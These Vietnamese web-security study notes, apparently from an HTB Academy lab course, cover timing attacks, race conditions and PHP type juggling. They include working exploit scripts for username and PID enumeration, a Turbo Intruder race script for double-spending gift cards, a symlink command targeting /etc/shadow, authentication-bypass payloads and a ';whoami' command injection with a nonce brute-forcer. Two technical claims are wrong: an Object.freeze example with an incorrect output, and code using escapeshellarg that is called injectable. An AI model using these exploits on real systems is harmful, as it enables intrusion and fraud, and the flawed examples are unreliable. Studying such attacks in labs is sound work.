2. **Object.freeze()**

Một phương pháp khác để ngăn ngừa *prototype pollution* là **đóng băng đối tượng**, nghĩa là không cho phép đối tượng đó bị thay đổi. Điều này có thể thực hiện bằng cách sử dụng hàm `Object.freeze()`. Khi gọi hàm này trên đối tượng `Object.prototype` toàn cục (mà tất cả các đối tượng đều kế thừa), mọi thay đổi đối với nó sẽ bị cấm.

**Ví dụ:**

```javascript
Object.freeze(Object.prototype);

let obj = {};
obj.polluted = true;
console.log(obj.polluted); // undefined
```

Như ví dụ trên, khi chúng ta đóng băng đối tượng `Object.prototype`, thuộc tính `polluted` sẽ không được thêm vào đối tượng `obj` nữa, giúp ngăn chặn việc ô nhiễm prototype.

---


# 8. Giới thiệu về Điều kiện Cuộc đua và Tấn công Thời gian

Web applications thường dễ bị tấn công bởi các lỗ hổng nổi tiếng như **SQL Injection** và **Cross-Site Scripting (XSS)**. Ngoài ra, chúng còn dễ bị tổn thương bởi các lỗ hổng không chỉ có trong môi trường web, chẳng hạn như **race conditions** và **timing attacks**. Vì thiếu nhận thức trong giới phát triển, các lỗ hổng này xuất hiện khá phổ biến và có thể dẫn đến:  
- Rò rỉ hoặc mất dữ liệu.  
- Vượt qua logic nghiệp vụ của ứng dụng web.  

---

### **1. Timing Attacks (Tấn Công Dựa Trên Thời Gian)**  

**Timing attacks** là dạng **side-channel attacks** (tấn công kênh phụ), khai thác sự khác biệt về **thời gian tính toán** hoặc **thời gian xử lý** trong các thành phần dễ bị tổn thương.  

Thay vì tấn công trực tiếp vào các thành phần chính của ứng dụng web như cơ sở dữ liệu, **timing attacks** đo lường thời gian phản hồi để suy ra thông tin nhạy cảm. Ví dụ, trong tấn công **SQL Injection kiểu Blind**, thời gian phản hồi có thể cho biết thông tin về dữ liệu cơ sở dữ liệu. Tuy nhiên, ở đây, chúng ta sẽ tập trung vào các cuộc tấn công xuất phát từ **lỗi logic nghiệp vụ** của ứng dụng.  

#### **Ví dụ Timing Attack**  
Một ví dụ phổ biến là đo thời gian xử lý mật khẩu:  
- Ứng dụng kiểm tra mật khẩu từng ký tự một, dừng ngay khi phát hiện sai.  
- Bằng cách thử từng ký tự và đo thời gian phản hồi, kẻ tấn công có thể dần dần xác định được mật khẩu.  

**Cách phòng ngừa:**  
- Sử dụng các thuật toán xử lý mật khẩu có thời gian thực hiện cố định bất kể đầu vào.  

---

### **2. Race Conditions (Điều Kiện Cạnh Tranh)**  

**Race conditions** là lỗ hổng xảy ra khi **trình tự hoặc thời gian** thực thi của các hành động có thể ảnh hưởng đến kết quả một cách không mong muốn. Các chương trình **đa luồng** đặc biệt dễ bị ảnh hưởng, vì việc dự đoán sự tương tác giữa các luồng là khó khăn.  

#### **Ví dụ Kinh Điển: TOCTOU (Time-of-Check to Time-of-Use)**  
TOCTOU là lỗ hổng phổ biến trong các thao tác hệ thống tập tin, xảy ra khi:  
- **Time of Check:** Thời điểm kiểm tra điều kiện bảo mật.  
- **Time of Use:** Thời điểm sử dụng tài nguyên.  

**C-Code ví dụ:**  
```c
// Kiểm tra quyền truy cập
if (access(file, W_OK)) {
    return -1;
}
// Mở tệp
int fd = open(file, O_WRONLY);
```
**Quy trình khai thác:**  
1. Chương trình kiểm tra quyền truy cập tệp `file`.  
2. Sau khi kiểm tra, kẻ tấn công thay đổi tệp `file` thành một liên kết tượng trưng (symlink) trỏ tới tệp nhạy cảm, ví dụ: `/etc/shadow`.  
3. Khi chương trình mở tệp, nó sẽ hoạt động trên `/etc/shadow` mà không nhận ra tệp đã bị thay đổi.  

**Lệnh khai thác:**  
```bash
rm /tmp/test && ln -s /etc/shadow /tmp/test
```

#### **Race Conditions trong Web Applications**  
Trong ứng dụng web, **race conditions** xảy ra khi:  
- Các hành động được cho là **đồng bộ**, nhưng thực tế lại **bất đồng bộ**.  
- Ví dụ, PHP không hỗ trợ đa luồng, nhưng khi chạy trên Apache hoặc các web server khác, các worker thread có thể chạy đồng thời, gây ra các lỗ hổng.  

#### **Ví dụ Race Condition:**  
Một ứng dụng cho phép người dùng nạp tiền vào tài khoản và kiểm tra số dư trước khi ghi nhận giao dịch. Nếu hai yêu cầu được gửi đồng thời:  
1. Yêu cầu 1 kiểm tra số dư (số dư hợp lệ).  
2. Yêu cầu 2 ghi nhận giao dịch trước khi Yêu cầu 1 ghi nhận.  

Kết quả: Số dư có thể bị thao túng để thực hiện các giao dịch không mong muốn.  

**Cách phòng ngừa:**  
- Sử dụng **khoá đồng bộ** để đảm bảo các hành động không bị ghi đè.  
- Kiểm tra lại trạng thái của tài nguyên tại thời điểm ghi nhận giao dịch.  

---


# 9. Đếm người dùng qua thời gian phản hồi

#### **1. Tổng Quan về Lỗ Hổng User Enumeration qua Timing**  
User enumeration qua thời gian phản hồi là một trong những lỗ hổng phổ biến nhất dựa trên thời gian trong các ứng dụng web. Lỗ hổng này cho phép kẻ tấn công đo lường sự khác biệt trong thời gian xử lý để xác định xem tên người dùng có tồn tại trong hệ thống hay không.  

**Ví dụ:**  
- Nếu username không tồn tại, thời gian phản hồi sẽ nhanh hơn vì ứng dụng không thực hiện các bước xử lý tiếp theo.  
- Nếu username tồn tại, ứng dụng thực hiện thêm bước xử lý (như hash mật khẩu), dẫn đến thời gian phản hồi dài hơn.  

Mặc dù một số ứng dụng hiển thị thông báo rõ ràng khi username đã tồn tại, việc đo lường thời gian phản hồi vẫn có thể hữu ích trong các trường hợp thông báo lỗi chung chung.

---

#### **2. Phân Tích Code và Xác Định Lỗ Hổng**  

**Source Code:**
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    username = request.form['username']
    user = User.query.filter_by(username=username).first()
    if not user:
        return render_template('index.html', message='Incorrect Details', type='danger')
    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)
    if pw_hash == user.password:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))
    return render_template('index.html', message='Incorrect Details', type='danger')
```

**Phân tích:**  
- Bước tìm kiếm trong cơ sở dữ liệu: `User.query.filter_by(username=username).first()` chỉ thực hiện hashing nếu username tồn tại.  
- Hàm **`bcrypt.hashpw`** tốn nhiều thời gian xử lý, tạo ra sự khác biệt rõ rệt trong thời gian phản hồi.  

Khi username không tồn tại, ứng dụng trả về lỗi ngay lập tức mà không cần hashing. Điều này dẫn đến một **timing discrepancy** (sự chênh lệch thời gian) mà kẻ tấn công có thể khai thác.

---

#### **3. Khai Thác Lỗ Hổng: Script Enumeration**  

**Script Python mẫu:**  
```python
import requests

URL = "http://127.0.0.1:5000/login"
WORDLIST = "./xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.15

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()
        r = requests.post(URL, data={"username": username, "password": "invalid"})
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username found: {username}")
```

**Mô tả:**  
1. Script gửi yêu cầu POST với username từ một wordlist.  
2. Nếu thời gian phản hồi vượt qua ngưỡng `THRESHOLD_S` (ví dụ 0.15 giây), script xác định username hợp lệ.  

---


# 10. Lộ lọt dữ liệu qua thời gian phản hồi

#### **Tìm hiểu lỗ hổng**  
Lỗ hổng này khai thác sự khác biệt về thời gian xử lý của ứng dụng web để suy ra các thông tin nhạy cảm mà ứng dụng không hiển thị công khai. Trong ví dụ trên, ứng dụng kiểm tra thông tin meta của các tệp trên hệ thống tệp dựa trên quyền sở hữu.  

Dựa vào đoạn mã:  
1. **Kiểm tra quyền sở hữu sau khi xử lý:**  
   - Hàm `get_file_details()` tính toán meta thông tin (kích thước tệp, số lượng tệp con, và chủ sở hữu).  
   - Việc kiểm tra quyền sở hữu được thực hiện **sau** khi tính toán xong, dẫn đến thời gian xử lý khác nhau giữa các đường dẫn hợp lệ và không hợp lệ.  

#### **Khai thác**  
1. **Xác định đường dẫn hợp lệ:**  
   - Bằng cách gửi yêu cầu tới `/filecheck` với các đường dẫn khác nhau, có thể xác định đường dẫn nào tồn tại dựa trên thời gian phản hồi (đường dẫn hợp lệ mất nhiều thời gian hơn do cần tính toán meta thông tin).  

2. **Tấn công chi tiết:**  
   - **Liệt kê PID hợp lệ:**  
     - Thư mục `/proc/<pid>` chứa thông tin của các tiến trình.  
     - Bằng cách quét các giá trị `<pid>`, có thể xác định PID hợp lệ dựa trên thời gian phản hồi.  
   - **Liệt kê thư mục home hợp lệ:**  
     - Thư mục `/home/<user>` có thể được kiểm tra để liệt kê người dùng trên hệ thống.  

3. **Mã khai thác mẫu:**  
```python
import requests

URL = "http://127.0.0.1:1337/filecheck"
THRESHOLD_S = 0.003

for pid in range(0, 200):
    r = requests.get(URL, params={"filepath": f"/proc/{pid}/"})
    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"PID hợp lệ: {pid}")
```


# 11. Race Conditions trong Ứng dụng Web

**1. Định nghĩa:**  
Race conditions xuất hiện khi một ứng dụng web không xử lý đúng cách việc thực thi đồng thời của nhiều luồng (threads). Điều này có thể xảy ra ngay cả trong các ngôn ngữ đơn luồng như PHP, nếu máy chủ web hỗ trợ đa luồng. Khi các luồng cùng thao tác trên cùng một tài nguyên mà không có biện pháp đồng bộ, kết quả có thể không như mong đợi.

---

### **Phân Tích Lỗ Hổng Qua Ví Dụ**

#### **Mô tả ứng dụng:**  
Một trang web bán hàng cho phép người dùng nạp tiền qua mã quà tặng (gift card). Mã này được xử lý qua một hàm PHP, trong đó:
- Kiểm tra mã quà tặng có hợp lệ và lấy số tiền tương ứng.
- Cập nhật số dư người dùng.
- Vô hiệu hóa mã quà tặng.

#### **Mã PHP:**
```php
function redeem_gift_card($username, $code) {
    $gift_card_balance = check_gift_card_balance($code);
    if ($gift_card_balance === 0) {
        return "Invalid Gift Card Code!";
    }
    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);
    invalidate_gift_card($code);
    return "Successfully redeemed gift card. Your new balance is: " . $new_balance . '$';
}
```

#### **Lỗ hổng:**  
Hàm trên giả định rằng các hành động được thực hiện một cách đồng bộ. Tuy nhiên, nếu hai yêu cầu HTTP cùng lúc gọi hàm `redeem_gift_card`, cả hai luồng có thể:
1. Cùng kiểm tra mã quà tặng trước khi một trong hai luồng vô hiệu hóa mã.
2. Cập nhật số dư người dùng hai lần, dẫn đến việc áp dụng mã quà tặng hai lần.

**Kết quả:** Người dùng có thể khai thác lỗ hổng này để tăng số dư của mình bất hợp pháp.

---

### **Khai Thác Lỗ Hổng**

#### **Bước 1: Khắc phục vấn đề khóa file PHP sessions**
Do PHP sử dụng khóa file (file lock) để bảo vệ biến session, ta phải sử dụng nhiều session khác nhau để vượt qua vấn đề này. Ta có thể tạo nhiều session bằng cách đăng nhập nhiều lần và ghi lại các `PHPSESSID`.

#### **Bước 2: Tấn công với Burp Suite Turbo Intruder**
- Sử dụng Burp Suite để chặn và chỉnh sửa yêu cầu HTTP.
- Tạo script trong Turbo Intruder để gửi nhiều yêu cầu đồng thời với các `PHPSESSID` khác nhau.
- Ví dụ script Python trong Turbo Intruder:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    for sess in ["session1", "session2", "session3", "session4"]:
        engine.queue(target.req, sess, gate='race')
    engine.openGate('race')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
- Kết quả: Mã quà tặng được áp dụng nhiều lần, tăng số dư.

---


# 12. Giới thiệu về Type Juggling (Biến đổi kiểu) 

**Type juggling** trong PHP là một hành vi nội bộ chuyển đổi kiểu dữ liệu của biến trong một số ngữ cảnh, chẳng hạn như so sánh. Mặc dù điều này không phải là một lỗ hổng bảo mật bản chất, nhưng trong một số trường hợp cụ thể, nó có thể dẫn đến những kết quả không mong muốn và gây ra lỗ hổng bảo mật.

---

### So sánh lỏng lẻo và nghiêm ngặt trong PHP 

PHP hỗ trợ hai kiểu so sánh: 

1. **So sánh lỏng lẻo** (`==`): Thực hiện so sánh sau khi biến đổi kiểu dữ liệu (type juggling).
2. **So sánh nghiêm ngặt** (`===`): So sánh cả giá trị lẫn kiểu dữ liệu.

Ví dụ:

```php
$a = 42;
$b = "42";

// So sánh lỏng lẻo
if ($a == $b) { echo "So sánh lỏng lẻo"; }

// So sánh nghiêm ngặt
if ($a === $b) { echo "So sánh nghiêm ngặt"; }
```

- Với so sánh lỏng lẻo, PHP sẽ chuyển `$b` từ chuỗi `"42"` thành số nguyên `42`, và kết quả của phép so sánh là **đúng** (`true`).
- Với so sánh nghiêm ngặt, kiểu dữ liệu khác nhau (`int` vs `string`) dẫn đến kết quả là **sai** (`false`).

---

### Hành vi của Type Juggling trong so sánh 

**Một số trường hợp đáng chú ý:**

1. **So sánh chuỗi với số nguyên:**
   ```php
   1 == "1HelloWorld"; // Kết quả: true
   ```
   - Chuỗi `"1HelloWorld"` được chuyển thành số `1` trước khi so sánh.

2. **So sánh null với boolean:**
   ```php
   null < 1; // Kết quả: true
   ```
   - `null` được chuyển thành `false` và `1` thành `true`. Do đó, `false < true`.

3. **Chuỗi số và ký hiệu khoa học:**
   ```php
   "00" == "0e123"; // Kết quả: true
   ```
   - Cả hai chuỗi được chuyển thành số `0` trước khi so sánh.

4. **Thay đổi hành vi từ PHP 8.0.0:**
   Trước PHP 8.0.0:
   ```php
   0 == "php"; // true
   ```
   Từ PHP 8.0.0 trở đi:
   ```php
   0 == "php"; // false
   ```

---

### Bảng hành vi so sánh 

#### So sánh lỏng lẻo (`==`):

| Toán hạng 1 | Toán hạng 2 | Kết quả |
|-------------|-------------|---------|
| `true`      | `false`     | ✗       |
| `1`         | `"1"`       | ✓       |
| `"0"`       | `0`         | ✓       |
| `"php"`     | `0`         | ✓ (< PHP 8.0.0) |

#### So sánh nghiêm ngặt (`===`):

| Toán hạng 1 | Toán hạng 2 | Kết quả |
|-------------|-------------|---------|
| `true`      | `false`     | ✗       |
| `1`         | `"1"`       | ✗       |
| `"0"`       | `0`         | ✗       |

---

### Hành vi Type Juggling trong các ngôn ngữ khác 

Các ngôn ngữ như JavaScript cũng có hành vi tương tự:

- So sánh lỏng lẻo: `"0" == 0` là **true**.
- So sánh nghiêm ngặt: `"0" === 0` là **false**.

Tuy nhiên, JavaScript ít "dễ dãi" hơn PHP. Ví dụ:

```javascript
"0" == "0e1"; // false
```

Kết quả là **false** vì cả hai đều được xử lý như chuỗi.

---

# 13. Bỏ qua xác thực với Type Juggling trong PHP

**Type juggling** có thể gây ra các lỗ hổng bảo mật nghiêm trọng trong PHP nếu không được xử lý đúng cách. Sau đây là cách loại lỗ hổng này có thể dẫn đến việc bỏ qua xác thực:

---

### 1. **Ví dụ: Bypass `strcmp`**

Mã kiểm tra mật khẩu bằng `strcmp`:

```php
$admin_pw = "P@ssw0rd!";
if (isset($_POST['pw'])) {
    if (strcmp($_POST['pw'], $admin_pw) == 0) {
        // Đăng nhập thành công
        echo "Authenticated!";
    } else {
        // Sai thông tin đăng nhập
        echo "Invalid credentials";
    }
}
```

- **Hành vi**: Hàm `strcmp` trả về `0` nếu hai chuỗi bằng nhau. Tuy nhiên, nếu tham số đầu vào không phải chuỗi (ví dụ: một mảng), `strcmp` sẽ trả về `null`. 
- **Type juggling**: So sánh `null == 0` trong PHP dẫn đến kết quả **true**. 

**Khai thác**:
Gửi yêu cầu HTTP với một mảng thay vì chuỗi:
```
POST / HTTP/1.1
Host: vulnerable.site
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

pw[]=pwn
```

**Lưu ý**: Từ PHP 8.0.0 trở đi, `strcmp` sẽ báo lỗi nếu tham số không phải chuỗi.

---

### 2. **Magic Hashes**

Ví dụ thực tế hơn sử dụng hash của mật khẩu:

```php
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';
if (isset($_POST['pw']) && is_string($_POST['pw'])) {
    if (hash('sha256', $_POST['pw']) == $hashed_password) {
        // Đăng nhập thành công
        echo "Authenticated!";
    } else {
        // Sai thông tin đăng nhập
        echo "Invalid credentials";
    }
}
```

- **Vấn đề**: Nếu cả hai chuỗi hash đều có định dạng dạng số (`0e...`), PHP sẽ so sánh hai chuỗi dưới dạng số. Chuỗi dạng `0e...` được chuyển thành số `0`.
- **Magic hashes**: Một số giá trị đầu vào nhất định có thể tạo ra hash `0e...`. 

**Khai thác**:
Sử dụng giá trị `34250003024812` cho mật khẩu, vì:
```php
hash('sha256', '34250003024812') == '0e46289032038065916139621039085883773413820991920706299695051332';
```
Cả hai chuỗi hash đều được chuyển thành số `0`, dẫn đến so sánh **true**.

---

### 3. **Phân tích lỗ hổng qua mã**

**Mã trong `index.php`:**
```php
if (isset($data['username']) && isset($data['password'])) {
    $user = get_user($data['username']);
    if ($user) {
        if ($data['password'] == $user['password']) { // So sánh lỏng lẻo
            $_SESSION['username'] = $data['username'];
            $_SESSION['loggedin'] = true;
            echo "Success";
        } else {
            echo "Fail";
        }
    }
}
```

- So sánh lỏng lẻo trong kiểm tra mật khẩu cho phép khai thác type juggling nếu giá trị mật khẩu là một kiểu dữ liệu khác.

**Mã trong `profile.php`:**
```php
if (strpos($_SESSION['username'], 'admin') !== false) {
    $content = get_admin_info();
}
```

- Bất kỳ tên người dùng nào chứa `admin` sẽ có quyền truy cập. Tuy nhiên, nếu không thể thay đổi tên người dùng, lỗ hổng này khó khai thác hơn.

---

### 4. **Khai thác**

Nếu máy chủ sử dụng PHP trước phiên bản 8.0.0, bạn có thể cung cấp một số `0` làm mật khẩu:
```json
{
  "username": "admin",
  "password": 0
}
```

Kết quả:
- `0 == $user['password']` trả về **true**.
- Bạn đăng nhập thành công dưới tài khoản quản trị viên và truy cập được các trang hạn chế.

---


# 14. Phân tích và Khai thác Lỗ hổng Command Injection qua Type Juggling

---

### 1. **Giới thiệu**

Ứng dụng web sử dụng HMAC (Hash-based Message Authentication Code) để bảo vệ các tham số `GET`. Tuy nhiên, do sự cố với **type juggling** trong PHP, một kẻ tấn công có thể vượt qua kiểm tra HMAC và thực hiện **command injection**.

---

### 2. **Mã nguồn và lỗ hổng**

#### **1. Chức năng tạo và kiểm tra HMAC**
```php
function custom_hmac($dir, $nonce) {
    $key = file_get_contents("/hmackey.txt");
    $length = 10;
    $mac = substr(hash_hmac('md5', "{$dir}||{$nonce}", $key), 0, $length);
    return $mac;
}

function check_hmac($dir, $nonce, $mac) {
    return $mac == custom_hmac($dir, $nonce);
}
```

- **Vấn đề**: `check_hmac` sử dụng so sánh lỏng lẻo (`==`) để kiểm tra MAC. Trong PHP, khi so sánh các giá trị dạng "số" (ví dụ: `0` và `0e...`), **type juggling** xảy ra và dẫn đến **true**.

---

#### **2. Lỗ hổng Command Injection trong `dir.php`**
Trong mã `dir.php`, tham số `dir` được sử dụng trực tiếp trong lệnh shell:
```php
$command = "ls " . escapeshellarg($_GET['dir']);
$output = shell_exec($command);
echo $output;
```

- **Vấn đề**: Nếu giá trị của `dir` không được xử lý đúng cách, kẻ tấn công có thể chèn các lệnh hệ thống.

---

### 3. **Khai thác**

#### **1. Xác nhận Command Injection**

1. **Tạm bỏ qua kiểm tra MAC**:
   Chỉnh sửa hàm `check_hmac` để luôn trả về `true`:
   ```php
   function check_hmac($dir, $nonce, $mac) {
       return true;
   }
   ```

2. **Gửi yêu cầu HTTP với payload độc hại**:
   ```http
   GET /dir.php?dir=/home/htb-stdnt/;whoami&nonce=1234&mac=anything HTTP/1.1
   ```
   Kết quả: Lệnh `whoami` được thực thi và trả về tên người dùng hiện tại.

---

#### **2. Khai thác Type Juggling để vượt qua kiểm tra MAC**

1. **Thay đổi lại hàm `check_hmac`** để kiểm tra MAC:
   ```php
   function check_hmac($dir, $nonce, $mac) {
       return $mac == custom_hmac($dir, $nonce);
   }
   ```

2. **Tận dụng type juggling**:
   - Chọn giá trị `mac` là `0`, do:
     ```php
     "0" == "0e..." // Trả về true
     ```
   - Payload:
     ```http
     GET /dir.php?dir=/home/htb-stdnt/;whoami&nonce=0&mac=0 HTTP/1.1
     ```

3. **Brute-force giá trị nonce hợp lệ**:
   Vì HMAC phụ thuộc vào `nonce`, kẻ tấn công cần tìm giá trị `nonce` tạo ra MAC hợp lệ.

#### **3. Brute-force giá trị nonce**

1. **Script tự động tìm nonce**:
   ```python
   import requests

   URL = "http://127.0.0.1:8000/dir.php"
   DIR = "/home/htb-stdnt/; whoami"
   MAC = 0
   MAX_NONCE = 20000

   def prepare_params(nonce):
       return {"dir": DIR, "nonce": nonce, "mac": MAC}

   def make_request(nonce):
       return requests.get(URL, params=prepare_params(nonce))

   # Main
   for n in range(MAX_NONCE):
       r = make_request(n)
       if "Error! Invalid MAC" not in r.text:
           print(f"Valid MAC found: {r.url}")
           break
   ```

2. **Chạy script**:
   - Script sẽ thử tất cả giá trị `nonce` từ 0 đến `MAX_NONCE` và dừng khi tìm thấy nonce tạo ra MAC hợp lệ.

---

### 4. **Kết quả**

- Với payload:
  ```
  dir=/home/htb-stdnt/;whoami
  ```
  Và nonce hợp lệ (ví dụ: `3082`), URL khai thác là:
  ```
  http://127.0.0.1:8000/dir.php?dir=/home/htb-stdnt/;whoami&nonce=3082&mac=0
  ```

- Truy cập URL này, lệnh `whoami` được thực thi, xác nhận lỗ hổng.

